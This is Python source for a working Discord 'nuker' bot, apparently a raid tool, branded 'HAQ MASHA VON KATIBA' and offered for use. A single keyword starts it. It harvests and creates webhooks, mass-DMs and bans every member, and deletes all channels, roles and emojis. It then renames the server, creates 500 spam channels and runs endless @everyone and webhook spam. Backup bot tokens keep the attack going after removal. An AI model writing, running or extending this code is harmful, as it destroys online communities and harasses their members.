import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import json
import aiohttp

# ============================================
# CONFIGURATION
# ============================================
os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗  ║
║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗ ║
║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║ ║
║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║ ║
║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║ ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
║                                                                               ║
║                    ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗     ║
║                    ██╔════╝██║   ██║██╔════╝╚══██╔══╝██╔════╝████╗ ████║     ║
║                    ███████╗██║   ██║█████╗     ██║   █████╗  ██╔████╔██║     ║
║                    ╚════██║██║   ██║██╔══╝     ██║   ██╔══╝  ██║╚██╔╝██║     ║
║                    ███████║╚██████╔╝███████╗   ██║   ███████╗██║ ╚═╝ ██║     ║
║                    ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝     ║
║                                                                               ║
║                         HAQ MASHA VON KATIBA SYSTEM                           ║
║                         MULTI-BOT NUKER v8.0                                  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""")

# Load or create webhook database
if os.path.exists("webhooks.json"):
    with open("webhooks.json", "r") as f:
        WEBHOOK_DB = json.load(f)
else:
    WEBHOOK_DB = {}

# Load bot tokens
if os.path.exists("tokens.json"):
    with open("tokens.json", "r") as f:
        TOKENS = json.load(f)
else:
    TOKENS = []

print("[!] WEBHOOK DATABASE LOADED")
print(f"[!] {len(TOKENS)} BACKUP BOTS READY\n")

# Main bot token
MAIN_TOKEN = input("[?] ENTER MAIN BOT TOKEN > ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="", intents=intents)

# ============================================
# MESSAGES
# ============================================
HAQ_MESSAGE = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ ║
║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗║
║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║║
║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║║
║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║║
║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝║
║                                                                               ║
║                    ██████╗ ███╗   ██╗    ██╗   ██╗ ██████╗ ███╗   ██╗        ║
║                    ██╔══██╗████╗  ██║    ██║   ██║██╔═══██╗████╗  ██║        ║
║                    ██████╔╝██╔██╗ ██║    ██║   ██║██║   ██║██╔██╗ ██║        ║
║                    ██╔══██╗██║╚██╗██║    ╚██╗ ██╔╝██║   ██║██║╚██╗██║        ║
║                    ██████╔╝██║ ╚████║     ╚████╔╝ ╚██████╔╝██║ ╚████║        ║
║                    ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝        ║
║                                                                               ║
║                                                                               ║
║                    ██╗   ██╗ ██████╗ ██╗   ██╗    ██╗  ██╗ █████╗ ██╗   ██╗ ██████╗ ███████╗
║                    ██║   ██║██╔═══██╗██║   ██║    ██║  ██║██╔══██╗██║   ██║██╔═══██╗██╔════╝
║                    ██║   ██║██║   ██║██║   ██║    ███████║███████║██║   ██║██║   ██║███████╗
║                    ╚██╗ ██╔╝██║   ██║██║   ██║    ██╔══██║██╔══██║██║   ██║██║   ██║╚════██║
║                     ╚████╔╝ ╚██████╔╝╚██████╔╝    ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
║                      ╚═══╝   ╚═════╝  ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
║                                                                               ║
║                                                                               ║
║                    YOU HAVE BEEN TERMINATED BY                                ║
║                    HAQ MASHA & VON KATIBA TEAM                                ║
║                                                                               ║
║                    https://discord.gg/c7cgYk4V                                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

SPAM_LIST = [
    "@everyone **HAQ MASHA VON KATIBA TEAM DESTROYED THIS SERVER**",
    "```VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH```",
    "@everyone **https://discord.gg/c7cgYk4V**",
    "```HAQ MASHA + VON KATIBA = MAXIMUM DESTRUCTION```",
    "**الكتيبة هاق مشا تيم - VON KATIBA**",
    "@everyone **YOUR SERVER IS GONE FOREVER**",
    "```VON KATIBA WAS HERE```",
    "**HAQ MASHA TEAM - VON KATIBA EDITION**",
    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "```YOU HAVE BEEN VON KATIBA'ED```"
]

# ============================================
# WEBHOOK MANAGEMENT
# ============================================
def save_webhooks(guild_id, webhook_urls):
    if str(guild_id) not in WEBHOOK_DB:
        WEBHOOK_DB[str(guild_id)] = []
    WEBHOOK_DB[str(guild_id)].extend(webhook_urls)
    with open("webhooks.json", "w") as f:
        json.dump(WEBHOOK_DB, f)

def get_webhooks(guild_id):
    return WEBHOOK_DB.get(str(guild_id), [])

# ============================================
# BACKUP BOTS SYSTEM
# ============================================
class BackupBot:
    def __init__(self, token, name):
        self.token = token
        self.name = name
        self.bot = None
        self.running = False
    
    async def start(self):
        self.bot = commands.Bot(command_prefix="", intents=discord.Intents.all())
        
        @self.bot.event
        async def on_ready():
            print(f"[✓] BACKUP BOT ONLINE: {self.bot.user.name}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.content.lower() == 'v':
                await self.nuke(message)
        
        try:
            await self.bot.start(self.token)
        except:
            print(f"[✗] FAILED TO START {self.name}")
    
    async def nuke(self, ctx):
        guild = ctx.guild
        channel = ctx.channel
        
        await channel.send("```🔥 VON KATIBA BACKUP BOT ACTIVATED 🔥```")
        
        # Ban all members
        for member in await guild.fetch_members(limit=None).flatten():
            if not member.bot:
                try:
                    await member.send(HAQ_MESSAGE)
                    await member.ban(reason="VON KATIBA")
                    await asyncio.sleep(0.05)
                except:
                    pass
        
        # Delete everything
        for ch in guild.channels:
            try:
                await ch.delete()
                await asyncio.sleep(0.02)
            except:
                pass
        
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    await asyncio.sleep(0.02)
                except:
                    pass
        
        # Create spam channels
        for i in range(100):
            try:
                await guild.create_text_channel(name=f"von-katiba-{i}")
            except:
                pass
        
        # Use saved webhooks
        webhooks = get_webhooks(guild.id)
        for webhook_url in webhooks:
            async with aiohttp.ClientSession() as session:
                for _ in range(50):
                    try:
                        async with session.post(webhook_url, json={"content": random.choice(SPAM_LIST)}) as resp:
                            pass
                    except:
                        pass
                await asyncio.sleep(0.1)

backup_bots = []
for token_data in TOKENS:
    backup_bots.append(BackupBot(token_data["token"], token_data["name"]))

# ============================================
# MAIN BOT
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ✓ MAIN BOT ONLINE: {bot.user.name}
║              ✓ MAIN BOT ID: {bot.user.id}
║              ✓ SERVERS: {len(bot.guilds)}
║              ✓ BACKUP BOTS: {len(backup_bots)}
║              ✓ WEBHOOKS SAVED: {sum(len(v) for v in WEBHOOK_DB.values())}
║                                                                               ║
║              JUST TYPE 'v' IN ANY CHANNEL TO START                           ║
║              VON KATIBA + HAQ MASHA MODE ACTIVATED                           ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    # Start backup bots
    for backup in backup_bots:
        asyncio.create_task(backup.start())

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if message.content.lower() == 'v':
        await max_nuke(message)
    
    await bot.process_commands(message)

@bot.event
async def on_guild_remove(guild):
    # If main bot gets kicked, backup bots take over
    print(f"[!] MAIN BOT REMOVED FROM {guild.name}")
    print(f"[!] BACKUP BOTS WILL CONTINUE THE ATTACK")
    
    for backup in backup_bots:
        if backup.running:
            for guild in backup.bot.guilds:
                for channel in guild.text_channels:
                    await channel.send("```🔥 HAQ MASHA VON KATIBA BACKUP SYSTEM ACTIVATED 🔥```")
                    await channel.send(HAQ_MESSAGE)

async def max_nuke(ctx):
    if isinstance(ctx, discord.Message):
        guild = ctx.guild
        channel = ctx.channel
    else:
        guild = ctx.guild
        channel = ctx.channel
    
    start_time = time.time()
    
    await channel.send("```🔥 HAQ MASHA + VON KATIBA MAXIMUM NUKE INITIATED 🔥```")
    print(f"\n[!] VON KATIBA NUKE STARTED ON: {guild.name}")
    
    # ============================================
    # PHASE 1: SAVE ALL WEBHOOKS
    # ============================================
    await channel.send("**🪝 PHASE 1: SAVING ALL WEBHOOKS**")
    
    saved_webhooks = []
    for ch in guild.text_channels:
        webhooks = await ch.webhooks()
        for webhook in webhooks:
            saved_webhooks.append(webhook.url)
    
    save_webhooks(guild.id, saved_webhooks)
    await channel.send(f"**✅ SAVED {len(saved_webhooks)} WEBHOOKS**")
    
    # ============================================
    # PHASE 2: CREATE 200 NEW WEBHOOKS
    # ============================================
    await channel.send("**🪝 PHASE 2: CREATING 200 WEBHOOKS**")
    
    new_webhooks = []
    for ch in guild.text_channels[:50]:
        for i in range(4):
            try:
                webhook = await ch.create_webhook(name=f"VON-KATIBA-{i}")
                new_webhooks.append(webhook.url)
                await asyncio.sleep(0.05)
            except:
                pass
    
    save_webhooks(guild.id, new_webhooks)
    await channel.send(f"**✅ CREATED {len(new_webhooks)} NEW WEBHOOKS**")
    
    # ============================================
    # PHASE 3: TORTURE + BAN ALL MEMBERS
    # ============================================
    await channel.send("**🔪 PHASE 3: TORTURING AND BANNING ALL MEMBERS**")
    
    members = await guild.fetch_members(limit=None).flatten()
    total = len([m for m in members if not m.bot])
    tortured = 0
    
    for member in members:
        if not member.bot:
            try:
                for _ in range(5):
                    await member.send(HAQ_MESSAGE)
                    await asyncio.sleep(0.1)
                await member.ban(reason="VON KATIBA HAQ MASHA")
                tortured += 1
                if tortured % 5 == 0:
                    await channel.send(f"**TORTURED & BANNED {tortured}/{total}**")
                await asyncio.sleep(0.05)
            except:
                pass
    
    await channel.send(f"**✅ TORTURED & BANNED {tortured} MEMBERS**")
    
    # ============================================
    # PHASE 4: DELETE EVERYTHING
    # ============================================
    await channel.send("**🗑️ PHASE 4: DELETING EVERYTHING**")
    
    # Delete channels
    for ch in guild.channels:
        try:
            await ch.delete()
            await asyncio.sleep(0.02)
        except:
            pass
    
    # Delete roles
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.02)
            except:
                pass
    
    # Delete emojis
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(0.02)
        except:
            pass
    
    # ============================================
    # PHASE 5: RENAME SERVER
    # ============================================
    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "VON-HAQ", "KATIBA-MASHA", "DESTROYED-BY-VON"])
    try:
        await guild.edit(name=new_name)
        await channel.send(f"**✅ SERVER RENAMED TO: {new_name}**")
    except:
        pass
    
    # ============================================
    # PHASE 6: CREATE MASS CHANNELS (500)
    # ============================================
    await channel.send("**📁 PHASE 6: CREATING 500 CHANNELS**")
    
    for i in range(500):
        try:
            await guild.create_text_channel(name=f"von-katiba-{i}")
            if i % 50 == 0:
                await channel.send(f"**CREATED {i} CHANNELS**")
            await asyncio.sleep(0.01)
        except:
            pass
    
    # ============================================
    # PHASE 7: MASS WEBHOOK SPAM
    # ============================================
    await channel.send("**💬 PHASE 7: STARTING INFINITE WEBHOOK SPAM**")
    
    all_webhooks = get_webhooks(guild.id) + new_webhooks
    
    async def webhook_spam():
        while True:
            for webhook_url in all_webhooks:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(webhook_url, json={"content": random.choice(SPAM_LIST)}) as resp:
                            pass
                except:
                    pass
            await asyncio.sleep(0.05)
    
    async def channel_spam():
        while True:
            for ch in guild.text_channels:
                try:
                    await ch.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.02)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(webhook_spam())
    asyncio.create_task(channel_spam())
    
    # ============================================
    # PHASE 8: FINAL MESSAGE
    # ============================================
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    final_msg = f"""```diff
+ ╔═══════════════════════════════════════════════════════════════════════════════╗
+ ║                                                                               ║
+ ║                    SERVER DESTROYED BY HAQ MASHA & VON KATIBA                 ║
+ ║                                                                               ║
+ ║                    STATISTICS:                                                ║
+ ║                    • TORTURED & BANNED: {tortured} MEMBERS                    ║
+ ║                    • WEBHOOKS SAVED: {len(saved_webhooks)}                    ║
+ ║                    • WEBHOOKS CREATED: {len(new_webhooks)}                    ║
+ ║                    • CHANNELS DELETED: ALL                                    ║
+ ║                    • ROLES DELETED: ALL                                       ║
+ ║                    • TIME: {total_time} SECONDS                               ║
+ ║                                                                               ║
+ ║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
+ ║                                                                               ║
+ ║                    HAQ MASHA TEAM - ALGERIA                                   ║
+ ║                                                                               ║
+ ║                    https://discord.gg/c7cgYk4V                                ║
+ ║                                                                               ║
+ ╚═══════════════════════════════════════════════════════════════════════════════╝
```"""
    
    for ch in guild.text_channels:
        try:
            await ch.send(final_msg)
            break
        except:
            pass
    
    print(f"[✓] VON KATIBA NUKE COMPLETED ON: {guild.name} | TIME: {total_time}s")

# ============================================
# RUN MAIN BOT
# ============================================
bot.run(MAIN_TOKEN)
